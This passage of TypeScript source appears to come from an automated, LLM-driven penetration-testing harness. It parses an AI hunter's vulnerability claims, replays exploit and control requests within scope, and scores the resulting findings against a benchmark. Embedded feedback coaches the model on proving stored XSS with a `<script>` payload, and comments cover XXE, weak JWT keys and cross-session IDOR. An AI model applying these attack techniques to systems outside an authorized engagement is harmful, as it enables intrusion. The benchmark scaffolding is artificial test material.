                scope: "beat", succeededToolCalls, newArtifacts: beatArtifacts,
                repeatCounts: Object.fromEntries(repeatCounts),
              },
            });
            const r = isStalled(
              { succeededToolCalls, newArtifacts: beatArtifacts, calls: beatCalls },
              stallCfg);
            stallSpan.update({ output: { stalled: r.stalled, reason: r.reason } });
            return r;
          });

          if (stall.stalled) {
            // A beat that has already banked at least one finding is NOT stalled just
            // because a later attempt did no work — that's the hunter running dry,
            // which ends the loop gracefully, not a failure of the whole beat.
            if (findings.length === 0) {
              return await bail(stallCfg.exitCode, true, stall.reason);
            }
            return await bail(0, false, stall.reason);
          }

          // Only the messages produced DURING this attempt can contain its claim —
          // scanning the whole history back would risk re-parsing an earlier, already
          // banked claim as if it were new.
          const newMessages = run.messages.slice(priorLen);
          const claim = parseClaim(newMessages);
          // Report the canonical route, not the app's internal fully-qualified form:
          // `/api/contactUs/index` and `/api/contactUs` are the same handler, and the
          // bare route is what a report (and the live re-capture below) resolves to.
          // First resolve any endpoint the model emitted RELATIVE to the target base
          // (the brief renders URLs relative to <target> to save tokens) back to an
          // absolute in-scope URL, THEN canonicalize. Applies to the endpoint, the
          // control_url, and every step url — so the Tether/Axiom always see absolute
          // in-scope URLs regardless of whether the model wrote relative or absolute.
          if (claim && typeof claim.endpoint === "string") {
            claim.endpoint = canonicalizeEndpoint(resolveRelativeEndpoint(claim.endpoint, briefOrigins));
          }
          if (claim && typeof claim.control_url === "string") {
            claim.control_url = resolveRelativeEndpoint(claim.control_url, briefOrigins);
          }
          if (claim && Array.isArray(claim.steps)) {
            for (const st of claim.steps) {
              if (st && typeof st.url === "string") st.url = resolveRelativeEndpoint(st.url, briefOrigins);
            }
          }
          if (!claim) {
            if (run.stopReason === "max_turns") {
              // SAHW_MAX_TURNS_PER_FINDING cut this attempt off mid-hypothesis — it did
              // NOT finish (unlike "done"/"budget"/"aborted"). Ending the whole beat here
              // would let exactly the greedy-hypothesis failure mode the per-finding cap
              // exists to prevent take down the run instead of just this one attempt: the
              // shared turn/token budget still has plenty left. Abandon the hypothesis and
              // keep hunting.
              messages.push({ role: "user", content: feedbackForMaxTurnsPerFinding(maxTurnsPerFinding) });
              continue;
            }
            if (run.stopReason === "model_error") {
              // A transport/provider failure, NOT the hunter failing to produce a claim.
              // Reporting this as "no parseable claim" would blame the model for a network
              // fault and send a reader debugging the wrong layer. End the beat, keep every
              // finding already banked, and name the real cause.
              const why = `model call failed: ${run.modelError ?? "unknown"}`;
              if (findings.length === 0) return await bail(stallCfg.exitCode, true, why);
              return await bail(0, false, why);
            }
            // The attempt actually finished (stopReason "done"/"budget"/"aborted") without
            // a parseable claim — either the hunter explicitly declared itself done, or it
            // just didn't produce one. Per the stall rule, this is a stall ONLY when NOTHING
            // has been banked yet; once ≥1 finding is banked, the hunter running dry ends the
            // loop gracefully rather than failing the whole beat.
            if (findings.length === 0) {
              return await bail(stallCfg.exitCode, true, "hunter produced no parseable claim");
            }
            return await bail(0, false, null);
          }

          // A claim may carry durable recon facts under "intel" independent of its own
          // vuln_class/verdict — captured here, before the vuln_class/dedupe checks
          // below, so it survives even a rejected or duplicate claim.
          const claimIntel = extractIntel(claim);
          if (claimIntel) recoveredIntelFromClaims = { ...recoveredIntelFromClaims, ...claimIntel };

          if (!isVulnClass(claim.vuln_class)) {
            rejectedClaims.push({
              raw: claim.vuln_class,
              reason: `vuln_class ${JSON.stringify(claim.vuln_class)} is not in the allowed vocabulary`,
            });
            messages.push({ role: "user", content: feedbackForInvalidVulnClass(claim.vuln_class) });
            continue;
          }

          // STORED-XSS must be proven through the APP rendering persisted data, NOT by
          // reading back a file the exploit wrote via a file-read/LFI primitive (that
          // proves file-write, scores nothing, and is a non-canonical dead end). Reject
          // a stored_xss claim whose render endpoint is a file read (a file/path/page
          // query param, or a /show-style reader) and steer it to the persist→display
          // pair. Generic: keys on the request shape, not a target path.
          if (claim.vuln_class === "xss_stored") {
            const renderUrls = [claim.endpoint, ...(Array.isArray(claim.steps) ? claim.steps.map((s: any) => s?.url) : [])]
              .filter((u): u is string => typeof u === "string");
            const isFileRead = (u: string) =>
              /[?&](file|path|filepath|f|template|page|doc|view|include)=/i.test(u) || /\/show(\b|\/|\?)/i.test(u);
            if (renderUrls.some(isFileRead)) {
              rejectedClaims.push({ raw: `${claim.vuln_class}::${claim.endpoint}`, reason: "stored_xss proven via a file-read primitive — non-canonical" });
              messages.push({ role: "user", content:
                "REJECTED: a stored_xss whose render step reads a FILE (a file=/path=/page= param or a /show-style reader) proves file-write, not stored XSS, and scores nothing. Prove it through the APP: POST your `<script>` payload to a persist endpoint (e.g. an apply/create/post route, including its serialized/nested fields), then GET/POST the paired LIST/VIEW endpoint the app renders it back on, and body_contains the unescaped payload in THAT response. Do not read a file you planted." });
              continue;
            }
          }

          const dedupeKey = `${claim.vuln_class}::${claim.endpoint}`;
          if (seen.has(dedupeKey)) {
            duplicatesSuppressed += 1;
            messages.push({ role: "user", content: feedbackForDuplicate(claim.vuln_class, claim.endpoint) });
            continue;
          }

          // An exact (class, endpoint) already CONFIRMED anywhere in this engagement
          // (a prior beat, or an earlier finding banked THIS beat) is never replayed —
          // that is pure budget waste. A proved class on a DIFFERENT endpoint is NOT
          // suppressed: the benchmark scores per (class, endpoint, invariant), so a
          // second finding of the same class elsewhere is real progress, and the Axiom
          // still gates it on a genuine proof.
          const provedKey = `${claim.vuln_class}::${claim.endpoint}`;
          const bankedInv = provedByEndpoint.get(provedKey);
          // Suppress a bare duplicate, BUT let a legitimate invariant UPGRADE (a banked
          // weak partial being re-submitted as the class's strong invariant) through to
          // the Axiom — that is how a partial gets completed into a covered finding.
          if (bankedInv !== undefined && !isInvariantUpgrade(claim.vuln_class, bankedInv, claim.invariant.type)) {
            alreadyProvedSuppressed += 1;
            messages.push({ role: "user", content: feedbackForAlreadyProved(claim.vuln_class, claim.endpoint) });
            continue;
          }

          // Mandatory claim review (Defect 1) — runs BEFORE the Axiom replays anything.
          // Switchable via SAHW_CLAIM_REVIEW (default on); a broken/denied/timed-out
          // review must never block a verdict, so every non-"rejected" outcome
          // (including "unavailable") falls straight through to the Axiom exactly as
          // if this stage did not exist.
          if (reviewEnabled) {
            const review = await startActiveObservation("claim-review", async (crSpan) => {
              crSpan.update({
                input: {
                  vuln_class: claim.vuln_class, endpoint: claim.endpoint,
                  control_url: claim.control_url ?? null, invariant_type: claim.invariant.type,
                },
              });
              const r = await runClaimReview(runner, claim);
              crSpan.update({ output: { verdict: r.verdict, reasoning: r.reasoning } });
              return r;
            });

            if (review.verdict === "rejected") {
              // Skip the Axiom replay entirely — this is the whole point: no exploit or
              // control request is ever sent for a claim the reviewer judged
              // unsupportable, saving target traffic on a claim that was never going
              // to hold.
              failureCauses.review_rejected += 1;
              const row: FindingRow = {
                engagement_id: engagement.authRef,
                finding_id: `SAHW-${randomUUID().slice(0, 8)}`,
                vuln_class: claim.vuln_class,
                endpoint: claim.endpoint,
                verdict: "FALSE_POSITIVE",
                invariant_type: claim.invariant.type,
                verdict_reason: boundReason(
                  review.reasoning || "adversarial-self-review rejected this claim before replay"),
                langfuse_trace_id: obs.traceId(),
                utc: new Date().toISOString(),
              };
              attemptedEntries.push({
                vuln_class: claim.vuln_class, endpoint: claim.endpoint,
                invariant_type: claim.invariant.type, outcome: "REVIEW_REJECTED",
                why: review.reasoning || "adversarial-self-review rejected this claim before replay",
              });
              findings.push({ ...row, failure_cause: "review_rejected" });
              seen.add(dedupeKey);
              await obs.mergeEndpoint(claim.endpoint, "GET");
              await obs.mergeFinding(row);
              await obs.recordFinding(row);
              messages.push({
                role: "user",
                content: feedbackForVerdict(
                  row.vuln_class, row.endpoint, row.verdict,
                  review.reasoning || "rejected by the adversarial-self-review pre-filter",
                  "review_rejected", review.reasoning,
                ),
              });
              continue;
            }
            // "survives" / "downgraded" / "unavailable" all proceed to the Axiom below.
          }

          // Axiom: replay the exploit, a control when the invariant type needs one,
          // and — for the four evidence-bundle types — the claim's own `steps` /
          // `derived_input` evidence plan, then evaluate the typed invariant.
          const invType = claim.invariant.type as InvariantType;
          // claim.session (a label, e.g. "A"/"B") threads through to http_request's
          // `session` arg on BOTH the exploit and control replay — proof-capture now
          // runs authenticated exactly as the hunter's own exploration did, through
          // the SAME Tether-gated http_request path (secrets still redacted in
          // spans/artifacts; see tools.ts). Undefined behaves exactly as before —
          // an anonymous request.
          const claimSession = typeof claim.session === "string" ? claim.session : undefined;
          // Replay the EXACT request the finding needs — a claim may carry `request`
          // (method/headers/body) so a POST-based proof (signup policy, transfer,
          // reset) is reproduced, not flattened to a GET. `control_request` does the
          // same for the control leg; both default to GET when absent (back-compat).
          const exploitReq = claimCaptureRequest(claim, "request");
          const exploit = await capture(runner, claim.endpoint, claimSession, exploitReq);
          const control = (invType === "body_contains" || invType === "status_in")
            ? await capture(runner, claim.control_url, claimSession,
                claimCaptureRequest(claim, "control_request")
                // if only the exploit method was given, mirror it for the control so a
                // POST exploit is compared against a POST control, not a GET.
                ?? (exploitReq?.method ? { method: exploitReq.method } : undefined))
            : null;                                  // every other type proves itself from
                                                       // its own evidence, never a control diff
          if (exploit) discoveredEndpoints.push(toSpineEndpoint(exploit));
          if (control) discoveredEndpoints.push(toSpineEndpoint(control));

          // The types that read the exploit response directly (body_contains,
          // status_in, response_asserted) cannot be evaluated when the exploit
          // request itself could not be captured — capture() returns null for a
          // network failure, a session the endpoint refused, or an unresolvable URL.
          // That is a per-CLAIM dead end, NOT a reason to abort the whole beat (which
          // would discard every finding already banked this beat), and it must never
          // reach evaluate()/computeDifferentialSignal() with a null exploit. The
          // evidence-bundle types (derived/state_*/file_*) prove from `evidence`, so a
          // null exploit is irrelevant to them and they are deliberately NOT gated here.
          const exploitReadDirectly =
            invType === "body_contains" || invType === "status_in" || invType === "response_asserted";
          const exploitUncapturable = exploitReadDirectly && !exploit;

          let evidence: EvidenceBundle | undefined;
          if (invType === "derived") {
            let derivedInput = await resolveDerivedInput(
              claim.invariant.expression, claim.derived_input, scopeOrigins,
              opts.tlsProber ?? defaultTlsProber,
            );
            // ADAPTIVE session-auth injection. A derived proof may need auth material
            // the model CANNOT see — chiefly the JWT for hs256_weak_key/
            // jwt_payload_contains. If the claim's derived_input names a session it
            // holds (jwt_from_session / auth_from_session / session), the orchestrator
            // injects that session's token as `jwt` here. The model supplies only what
            // it legitimately recovered (candidate keys from the disclosed source) and
            // the session LABEL; it never handles the token. This lets the model chain
            // its own intel ("I extracted key K and hold session A -> prove
            // hs256_weak_key(session:A, candidates:[K])") without a hardcoded prover.
            derivedInput = injectSessionAuthForDerived(derivedInput, runner);
            evidence = { derivedInput };
          } else if (
            invType === "state_changed" || invType === "state_violated" || invType === "file_created_then_deleted"
          ) {
            const steps = parseSteps(claim.steps);
            const captures = await runSteps(runner, steps);
            for (const c of captures) discoveredEndpoints.push(toSpineEndpoint(c));
            evidence = { captures };
          }

          const axiom = await startActiveObservation("axiom-eval", async (axSpan) => {
            axSpan.update({
              input: {
                invariant: claim.invariant,
                exploitStatus: exploit?.response.status ?? null,
                controlStatus: control?.response.status ?? null,
                evidenceCaptures: evidence?.captures?.length ?? null,
                hasDerivedInput: evidence ? evidence.derivedInput !== undefined : null,
              },
            });
            const r = exploitUncapturable
              ? {
                  status: "NEEDS_REVIEW" as const,
                  reason:
                    "exploit request could not be captured (no response — network " +
                    "failure, refused session, or unresolvable URL); cannot evaluate",
                }
              : evaluate(claim.invariant as Invariant, exploit!, control, evidence);
            axSpan.update({ output: { status: r.status, reason: r.reason } });
            return r;
          });

          // The REAL trace id, read live from the active span — or null. Never a
          // placeholder: when tracing is unavailable this flows into gateProvenance as
          // null, which is the one field that then legitimately downgrades an otherwise
          // CONFIRMED finding to NEEDS_REVIEW. That is the Provenance Gate doing its
          // job, not a regression — see gateProvenance's own doc comment.
          const langfuseTraceId = obs.traceId();

          const gated = await startActiveObservation("provenance-gate", async (pgSpan) => {
            const provenance = {
              utc: new Date().toISOString(),
              langfuseTraceId,
              exploitRequestHash: exploit?.artifact.sha256 ?? null,
              stdoutSha256: exploit?.artifact.sha256 ?? null,
              sandboxId,
              exitCode: 0,
            };
            pgSpan.update({
              input: {
                fieldsPresent: {
                  utc: Boolean(provenance.utc),
                  langfuseTraceId: provenance.langfuseTraceId !== null,
                  exploitRequestHash: provenance.exploitRequestHash !== null,
                  stdoutSha256: provenance.stdoutSha256 !== null,
                  sandboxId: provenance.sandboxId !== null,
                  exitCode: provenance.exitCode !== null,
                },
              },
            });
            const r = await gateProvenance(provenance, axiom.status, store);
            pgSpan.update({ output: { status: r.status, missing: r.missing } });
            return r;
          });

          // Relabel an input-differential state_changed as the body_contains it
          // actually is. When a CONFIRMED state_changed's appeared:/disappeared: proof
          // used the SAME endpoint (method+url) with a DIFFERENT request body pre vs
          // post — read account id=A (control) then id=B (exploit); contactUs plain
          // then with an XXE payload — the response differs because the INPUT differed.
          // That is a body_contains differential (marker present in the exploit request,
          // absent in the benign control), NOT a server-state change. Record the
          // accurate invariant so the read/injection finding is scored as what it is. A
          // different-URL delta (a genuine creation/mutation) is left as state_changed.
          let effectiveInvariantType: InvariantType = claim.invariant.type as InvariantType;
          if (
            axiom.status === "CONFIRMED"
            && claim.invariant.type === "state_changed"
            && /^(appeared|disappeared):/.test(claim.invariant.expression ?? "")
            && evidence?.captures && evidence.captures.length >= 2
          ) {
            const first = evidence.captures[0];
            const last = evidence.captures[evidence.captures.length - 1];
            const key = (c: HttpCapture) => `${(c.request.method || "GET").toUpperCase()} ${c.request.url}`;
            if (key(first) === key(last) && (first.request.body ?? "") !== (last.request.body ?? "")) {
              effectiveInvariantType = "body_contains";
            }
          }

          // PRE-GATE LLM JUDGE (advisory) — scores this claim 0-100 against the SAME
          // strict deterministic rubric the Axiom applied. It NEVER overrides a
          // deterministic CONFIRMED/FALSE_POSITIVE; its only verdict effect is that a
          // HIGH score on a NEEDS_REVIEW may promote it to the DISTINCT
          // CONFIRMED_BY_ADJUDICATION tier. Opt-in via SAHW_JUDGE_MODEL; fails OPEN
          // (disabled/unavailable => verdict unchanged), so the deterministic gate
          // remains sole authority. Secret derived VALUES (jwt/key/iv) are never sent
          // to the judge — only field-shape.
          const judgeModel = opts.env.SAHW_JUDGE_MODEL?.trim();
          const promoteThreshold = numEnv(opts.env, "SAHW_AXIOM_JUDGE_THRESHOLD", 85);
          const safeDerivedSummary = (() => {
            const di = evidence?.derivedInput as Record<string, unknown> | undefined;
            if (!di || typeof di !== "object") return undefined;
            return Object.entries(di).map(([k, v]) =>
              `${k}:${typeof v === "string" ? `str(${(v as string).length})` : Array.isArray(v) ? `arr(${(v as unknown[]).length})` : typeof v}`).join(", ");
          })();
          const judge = judgeModel
            ? await startActiveObservation("judge", async (jSpan) => {
                const js = await judgeClaim({
                  client: opts.client as unknown as import("./judge.js").JudgeClient, model: judgeModel,
                  vulnClass: claim.vuln_class, invariant: claim.invariant as Invariant,
                  exploit, control, steps: evidence?.captures, derivedInputSummary: safeDerivedSummary,
                  bodyBytes: numEnv(opts.env, "SAHW_TOOL_PREVIEW_BYTES", 1400), signal: controller.signal,
                });
                jSpan.update({ output: { score: js.score, lean: js.lean, ok: js.ok, model: js.model, rationale: js.rationale } });
                return js;
              })
            : { score: -1, lean: "unsure" as const, rationale: "judge disabled", model: "disabled", ok: false };
          const adjudicatedStatus: string =
            (gated.status === "NEEDS_REVIEW" && judge.ok && judge.score >= promoteThreshold)
              ? "CONFIRMED_BY_ADJUDICATION"
              : gated.status;

          // The rationale carried on the record. For an adjudication promotion it names
          // the judge score + rationale; otherwise it is the final gated verdict's reason
          // (which reflects a provenance downgrade if one happened), falling back to the
          // raw Axiom reason. Bounded so a long reason can't bloat the row.
          const verdictReason = boundReason(
            adjudicatedStatus === "CONFIRMED_BY_ADJUDICATION"
              ? `adjudication promoted NEEDS_REVIEW (judge score ${judge.score}): ${judge.rationale}`
              : gated.status !== axiom.status
                ? `${axiom.reason} — provenance-gated to ${gated.status} (missing: ${gated.missing.join(", ") || "n/a"})`
                : (axiom.reason || ""));
          const row: FindingRow = {
            engagement_id: engagement.authRef,
            finding_id: `SAHW-${randomUUID().slice(0, 8)}`,
            vuln_class: claim.vuln_class,
            endpoint: claim.endpoint,
            verdict: adjudicatedStatus,
            invariant_type: effectiveInvariantType,
            verdict_reason: verdictReason,
            langfuse_trace_id: langfuseTraceId,
            utc: new Date().toISOString(),
          };

          // Defect 2: classify WHY a non-CONFIRMED finding failed, from structured
          // facts only — never by reading axiom.reason's prose. Uses the RAW axiom
          // verdict (see the routing comment below for why raw, not gated).
          const differentialSignal = computeDifferentialSignal(claim.invariant as Invariant, exploit, control);
          const failureCause = classifyFailureCause({
            axiomStatus: axiom.status,
            vulnClass: claim.vuln_class,
            invariantType: claim.invariant.type,
            hasControl: control !== null,
            markerInExploit: differentialSignal.markerInExploit,
            markerInControl: differentialSignal.markerInControl,
            endpointIsStaticAsset: isStaticAssetCapture(exploit),
          });
          if (failureCause) failureCauses[failureCause] += 1;

          // Route into the spine on the RAW axiom verdict, not the provenance-gated
          // one: a hypothesis whose invariant genuinely passed (axiom.status ===
          // "CONFIRMED") belongs in `proved` even if gateProvenance downgraded the
          // reported verdict to NEEDS_REVIEW for missing tracing — that downgrade is
          // an infra/provenance concern, not evidence the hunter should re-derive
          // this pair next beat. Anything the invariant itself did not pass
          // (FALSE_POSITIVE / NEEDS_REVIEW / BLOCKED from axiom) is a real dead end.
          if (axiom.status === "CONFIRMED") {
            provedEntries.push({
              vuln_class: claim.vuln_class, endpoint: claim.endpoint,
              invariant_type: effectiveInvariantType, verdict: gated.status, finding_id: row.finding_id,
            });
            // Grow the same-beat map immediately — record the STRONGEST invariant banked
            // for this (class, endpoint) so a bare duplicate is short-circuited but a
            // later UPGRADE to the strong invariant is still allowed through.
            {
              const k = `${claim.vuln_class}::${claim.endpoint}`;
              const prev = provedByEndpoint.get(k);
              if (prev === undefined || isInvariantUpgrade(claim.vuln_class, prev, effectiveInvariantType)) {
                provedByEndpoint.set(k, effectiveInvariantType);
              }
            }
          } else {
            attemptedEntries.push({
              vuln_class: claim.vuln_class, endpoint: claim.endpoint,
              invariant_type: claim.invariant.type, outcome: axiom.status, why: axiom.reason,
            });
          }

          // Bank it as soon as it's confirmed, not at the end of the beat — a run
          // that dies mid-way must still have what it already proved.
          findings.push(failureCause ? { ...row, failure_cause: failureCause } : row);
          seen.add(dedupeKey);
          await obs.mergeEndpoint(claim.endpoint, "GET");
          await obs.mergeFinding(row);
          await obs.recordFinding(row);

          messages.push({
            role: "user",
            content: feedbackForVerdict(
              row.vuln_class, row.endpoint, row.verdict, axiom.reason,
              failureCause ?? undefined, undefined, effectiveInvariantType,
            ),
          });
        }
        }
      }
    });
  } finally {
    clearTimeout(timer);
    // Runs AFTER the "beat" span (and every child span opened inside it) has
    // already ended, so shutdown flushes a complete trace rather than racing it.
    await obs.shutdown();
  }
}

/**
 * Extract every balanced {...} region from a string. Models routinely wrap the
 * claim in ```json fences or wrap prose around it, so parsing the WHOLE message
 * as JSON (the original approach) failed on well-formed claims and the beat
 * reported a stall it had not actually suffered.
 */
function jsonCandidates(text: string): string[] {
  const out: string[] = [];
  let depth = 0, start = -1, inStr = false, esc = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (inStr) {
      if (esc) esc = false;
      else if (ch === "\\") esc = true;
      else if (ch === '"') inStr = false;
      continue;
    }
    if (ch === '"') { inStr = true; continue; }
    if (ch === "{") { if (depth === 0) start = i; depth++; }
    else if (ch === "}") {
      depth--;
      if (depth === 0 && start >= 0) { out.push(text.slice(start, i + 1)); start = -1; }
      if (depth < 0) depth = 0;
    }
  }
  return out;
}

// Invariant types whose proof shape is NOT an exploit/control differential — see
// axiom.ts's EvidenceBundle doc comment. response_asserted was already exempt from
// requiring control_url; the four newer types are evaluated from their own evidence
// (evidence.derivedInput / evidence.captures, assembled below from `derived_input` /
// `steps`) and likewise never need a control_url to be a well-formed claim.
const NO_CONTROL_INVARIANT_TYPES = new Set([
  "response_asserted", "derived", "state_changed", "state_violated", "file_created_then_deleted",
]);

/** Canonicalise a claimed endpoint URL to the route a report would name.
 *
 * CodeIgniter (this and most PHP MVC targets) routes `controller` and
 * `controller/index` to the SAME handler — `index` is the default method. A hunter
 * that recovered the app's explicit route table will often claim the fully-qualified
 * internal form (`/api/contactUs/index`) while the canonical route a pentester writes
 * is `/api/contactUs`. Recording the fully-qualified form makes an otherwise-correct
 * finding look like it targets a different endpoint than it does. This strips ONLY a
 * trailing `/index` (optionally `/index.php`) path segment, preserving the query
 * string; it is a general framework convention, not an app-specific rewrite, and the
 * bare route is the one the answer key and a live request both resolve to. */
export function canonicalizeEndpoint(url: string): string {
  if (typeof url !== "string" || !url) return url;
  const q = url.indexOf("?");
  const base = q === -1 ? url : url.slice(0, q);
  const query = q === -1 ? "" : url.slice(q);
  const stripped = base.replace(/\/index(?:\.php)?\/?$/i, "");
  // Never collapse a bare origin (e.g. "http://h/index" is a real doc root file the
  // caller means literally); only strip when a path segment precedes it.
  if (!/^https?:\/\/[^/]+\/.+/.test(stripped)) return url;
  return stripped + query;
}

function parseClaim(messages: any[]): any | null {
  // PREFERRED path: a submit_finding tool call. Reasoning models call tools reliably
  // every turn but do not reliably end a turn with a free-text JSON object, so the
  // claim is carried as the tool call's arguments. Scan newest-first for one.
  for (let i = messages.length - 1; i >= 0; i--) {
    const calls = messages[i]?.tool_calls;
    if (!Array.isArray(calls)) continue;
    for (const call of calls) {
      if (call?.function?.name !== "submit_finding") continue;
      let o: any;
      try { o = JSON.parse(call.function.arguments ?? "{}"); } catch { continue; }
      if (!o?.endpoint || !o?.invariant?.type) continue;
      if (NO_CONTROL_INVARIANT_TYPES.has(o.invariant.type)) return o;
      if (o.control_url) return o;
      // A differential type submitted without a control is still the model's best
      // claim — return it so the beat can give a precise "needs a control" rejection
      // rather than silently falling through to a stale content-scanned claim.
      return o;
    }
  }
  // FALLBACK path (back-compat): a claim emitted as a fenced/bare JSON object in the
  // message content — the original contract, still honoured for models that use it.
  for (let i = messages.length - 1; i >= 0; i--) {
    const c = messages[i]?.content;
    if (typeof c !== "string") continue;
    // Longest first: a fenced claim is usually the largest balanced object present.
    for (const cand of jsonCandidates(c).sort((a, b) => b.length - a.length)) {
      let o: any;
      try { o = JSON.parse(cand); } catch { continue; }
      if (!o?.endpoint || !o?.invariant?.type) continue;
      // A differential type is worthless without a control; a self-contained one
      // must not have its verdict decided by an unrelated second request.
      if (NO_CONTROL_INVARIANT_TYPES.has(o.invariant.type)) return o;
      if (o.control_url) return o;
    }
  }
  return null;
}

/** `session`, when present, is the label the hunter attached to the claim (or one of
 * its steps) — forwarded verbatim to http_request's own `session` arg, which is the
 * ONLY path from a label to real auth material (see session.ts/tools.ts). This
 * function never sees or handles the material itself. */
/** One replayed request for a differential (body_contains / status_in) proof.
 * Defaults to a bare GET — the historical behaviour — but a claim may specify a
 * non-GET method, headers and/or body so the verifier reproduces the EXACT request
 * that triggers the finding. This closes a real gap: a signup/transfer/reset proof
 * lives in a POST BODY (e.g. a 1-character password returning a success code), which
 * a GET of the URL can never reproduce, so such a claim used to be un-confirmable.
 * Generic capability, no target specifics. */
interface CaptureRequest {
  method?: string;
  headers?: Record<string, string>;
  body?: string;
}

async function capture(
  runner: ToolRunner, url: string, session?: string, req?: CaptureRequest,
): Promise<HttpCapture | null> {
  const method = (typeof req?.method === "string" && req.method.trim()) ? req.method.trim().toUpperCase() : "GET";
  const args: Record<string, unknown> = { method, url };
  if (req?.headers && isRecordOfStrings(req.headers)) args.headers = req.headers;
  if (typeof req?.body === "string") args.body = req.body;
  if (session) args.session = session;
  const out = await runner.execute("http_request", args);
  return out.ok ? (out.result as HttpCapture) : null;
}

/** Reads a claim's optional per-request spec ({method,headers,body}) for the exploit
 * (`request`) or control (`control_request`) leg of a differential proof. */
export function claimCaptureRequest(claim: any, key: "request" | "control_request"): CaptureRequest | undefined {
  const r = claim?.[key];
  if (!r || typeof r !== "object" || Array.isArray(r)) return undefined;
  const out: CaptureRequest = {};
  if (typeof r.method === "string") out.method = r.method;
  if (r.headers && isRecordOfStrings(r.headers)) out.headers = r.headers;
  if (typeof r.body === "string") out.body = r.body;
  return out;
}

// ---- Evidence assembly for derived / state_changed / state_violated /
// file_created_then_deleted (Axiom's non-differential invariant types) ------------
//
// The hunter's claim carries its OWN evidence plan (see brief.ts <output_contract>):
//   `steps`         an ordered list of request specs the beat executes IN ORDER,
//                   through the SAME ToolRunner.execute("http_request", ...) path
//                   as everything else — so the Tether gates every one, and each is
//                   captured/hashed like any other request. This builds
//                   evidence.captures for state_changed / state_violated /
//                   file_created_then_deleted.
//   `derived_input` the typed input object for a `derived` claim's deriver, passed
//                   straight through as evidence.derivedInput (except
//                   tls_unavailable — see resolveDerivedInput below).

interface ClaimStep {
  method: string;
  url: string;
  headers?: Record<string, string>;
  body?: string;
  /** Optional session label (e.g. "A", "B") from a prior register_account call —
   * forwarded to http_request's own `session` arg for THIS step only. This is the
   * cross-user/IDOR mechanism: a setup step can create a resource under session A
   * while a later exploit step in the SAME `steps` sequence carries session B, so
   * the resource-owner's identity and the accessing identity can legitimately
   * differ within one claim. */
  session?: string;
}

function isRecordOfStrings(x: unknown): x is Record<string, string> {
  return typeof x === "object" && x !== null && !Array.isArray(x)
    && Object.values(x as Record<string, unknown>).every((v) => typeof v === "string");
}

/** Parses claim.steps into a well-shaped, ordered list. A malformed entry STOPS the
 * sequence there rather than skipping it — order is load-bearing for every consumer
 * (pre/post, attempt sequence, before/during/after), so silently dropping an entry
 * would shift everything after it out of position. A short/empty result is not an
 * error here: evaluate() itself turns "too few captures" into the authoritative
 * NEEDS_REVIEW reason once runSteps() below executes whatever this returns. */
function parseSteps(raw: unknown): ClaimStep[] {
  if (!Array.isArray(raw)) return [];
  const out: ClaimStep[] = [];
  for (const s of raw) {
    if (!s || typeof s !== "object") break;
    const method = typeof (s as any).method === "string" ? (s as any).method : null;
    const url = typeof (s as any).url === "string" ? (s as any).url : null;
    if (!method || !url) break;
    const headers = isRecordOfStrings((s as any).headers) ? (s as any).headers : undefined;
    const body = typeof (s as any).body === "string" ? (s as any).body : undefined;
    const session = typeof (s as any).session === "string" ? (s as any).session : undefined;
    out.push({ method, url, headers, body, session });
  }
  return out;
}

/** Executes claim.steps IN ORDER through the same gated tool path as every other
 * request (never bypassed). Stops at the first denied/failed step rather than
 * skipping it and continuing: a denied step must not silently vanish from the
 * sequence, and the resulting short capture list is exactly what makes evaluate()
 * NEEDS_REVIEW for the right, authoritative reason ("too few captures") instead of
 * beat.ts duplicating that judgement. */
async function runSteps(runner: ToolRunner, steps: ClaimStep[]): Promise<HttpCapture[]> {
  const captures: HttpCapture[] = [];
  for (const step of steps) {
    const args: Record<string, unknown> = { method: step.method, url: step.url };
    if (step.headers) args.headers = step.headers;
    if (step.body !== undefined) args.body = step.body;
    if (step.session) args.session = step.session;
    const out = await runner.execute("http_request", args);
    if (!out.ok) break;
    captures.push(out.result as HttpCapture);
  }
  return captures;
}

/** Injectable async TLS-reachability prober — see axiom.ts's tls_unavailable doc
 * comment. Production default performs a bounded, direct TLS connect attempt (never
 * routed through the Tether's http_request path, since it is not an HTTP exchange
 * and produces no capturable request/response); tests inject a fake one so they
 * never touch the network. Resolves true iff a TLS handshake completes. */
export type TlsProber = (origin: string) => Promise<boolean>;

async function defaultTlsProber(origin: string): Promise<boolean> {
  const { connect } = await import("node:tls");
  let host: string;
  let port: number;
  try {
    const u = new URL(origin);
    host = u.hostname;
    port = u.port ? Number(u.port) : 443;
  } catch {
    return false;
  }
  return await new Promise<boolean>((resolve) => {
    let settled = false;
    const finish = (result: boolean) => {
      if (settled) return;
      settled = true;
      try { socket.destroy(); } catch { /* already closed */ }
      resolve(result);
    };
    const socket = connect({ host, port, servername: host, timeout: 3000, rejectUnauthorized: false });
    socket.once("secureConnect", () => finish(true));
    socket.once("error", () => finish(false));
    socket.once("timeout", () => finish(false));
  });
}

/** Only origins that belong to this engagement's own scope are ever probed — the
 * hunter's derived_input.origins is untrusted claim content, and probing an
 * arbitrary host would be an SSRF-shaped scope violation identical in spirit to the
 * one http_request's Tether already guards against. Matched on host (hostname+port)
 * rather than the full origin string, since tls_unavailable asks about the HTTPS
 * form of a scope origin that may itself be recorded as http://. */
function isInScopeHost(origin: string, scopeOrigins: readonly string[]): boolean {
  let host: string;
  try {
    host = new URL(origin).host;
  } catch {
    return false;
  }
  return scopeOrigins.some((s) => {
    try { return new URL(s).host === host; } catch { return false; }
  });
}

/** Assembles evidence.derivedInput for a `derived` claim. tls_unavailable is the
 * one deriver whose input (a `prober` function) cannot travel through JSON — the
 * hunter instead supplies `derived_input: { origins: string[] }`, and THIS function
 * performs the async reachability probe (via the injectable TlsProber) for every
 * in-scope origin BEFORE evaluate() (synchronous) ever runs, then hands the deriver
 * a synchronous closure that reads the already-resolved results — exactly the
 * "resolve async, adapt into a sync closure" shape axiom.ts's doc comment
 * prescribes. Every other deriver's input passes through unchanged; validating its
 * shape is the deriver's own job (see axiom.ts), not duplicated here. An origin
 * outside scope is never probed and defaults to "reachable" in the closure — the
 * conservative direction, since a false "reachable" can only push the verdict away
 * from CONFIRMED, never manufacture one. */
/** If a derived claim's input names a session it holds (jwt_from_session /
 * auth_from_session / session), inject that session's token as `jwt` — the model
 * cannot see the token, so this is the only way it can prove a token-based derived
 * finding (hs256_weak_key, jwt_payload_contains). The model still supplies the
 * material it legitimately recovered (candidate keys); it just references the session
 * by label. A label that does not resolve is left untouched (the deriver then reports
 * missing input, never a guess). */
export function injectSessionAuthForDerived(input: unknown, runner: ToolRunner): unknown {
  if (!input || typeof input !== "object" || Array.isArray(input)) return input;
